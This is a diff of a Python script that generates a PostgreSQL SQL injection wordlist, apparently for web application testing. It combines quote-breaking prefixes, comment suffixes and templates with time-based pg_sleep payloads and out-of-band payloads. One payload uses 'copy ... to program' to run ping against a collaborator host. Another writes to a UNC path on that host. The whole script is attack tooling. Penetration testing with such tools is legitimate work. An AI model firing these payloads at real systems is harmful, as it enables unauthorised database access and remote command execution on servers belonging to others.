@@ -4,9 +4,12 @@
 prefixes = [
     '',
     ')',
-    '{quotation_mark}',
-    '{quotation_mark})',
+    '\'',
+    '\')',
+    '"',
+    '")',
 ]
+prefixes += [s + ';' for s in prefixes]
 
 suffixes = [
     '',
@@ -14,50 +17,39 @@ suffixes = [
     '/*',
     '%00'
 ]
-suffixes = suffixes + [';' + s for s in suffixes]
+suffixes += [';' + s for s in suffixes]
 
 quotation_marks = [
     '\'',
-    '"'
+    '$$'
 ]
 
-generic_templates = [
+templates = [
+    '\'||({payload})||\'',
+    '"||({payload})||"',
     '{prefix}{payload}{suffix}',
     '{prefix} union {payload}{suffix}',
-    '{prefix};({payload}){suffix}',
-    '{prefix}||({payload}){suffix}',
-]
-
-string_concat_templates = [
-    '{quotation_mark}||({payload})||{quotation_mark}'
+    '{prefix}({payload}){suffix}',
+    '{prefix}||({payload}){suffix}'
 ]
 
 payloads = [
     'select pg_sleep(20)',
     'select 1 from pg_sleep(20)',
-    'copy (SELECT \'\') to program \'ping {collaborator}\''
+    'copy (select {quotation_mark}{quotation_mark}) to program {quotation_mark}ping {collaborator}{quotation_mark}',
+    'copy (select {quotation_mark}{quotation_mark}) to {quotation_mark}\\\\\\\\{collaborator}\\\\a{quotation_mark}',
 ]
 
 def generate():
     wordlist = []
 
-    # string concat
-    for quotation_mark in quotation_marks:
-        for string_concat_template in string_concat_templates:
-            for payload in payloads:
-                word = string_concat_template
-                word = word.replace('{payload}',payload)
-                word = word.replace('{quotation_mark}',quotation_mark)
-                if word not in wordlist:
-                    wordlist.append(word)
-
     # generic
     for quotation_mark in quotation_marks:
-        for generic_template in generic_templates:
+        for template in templates:
             for payload in payloads:
                 for prefix in prefixes:
                     for suffix in suffixes:
-                        word = generic_template
+                        word = template
                         word = word.replace('{prefix}',prefix)
                         word = word.replace('{suffix}',suffix)
                         word = word.replace('{payload}',payload)
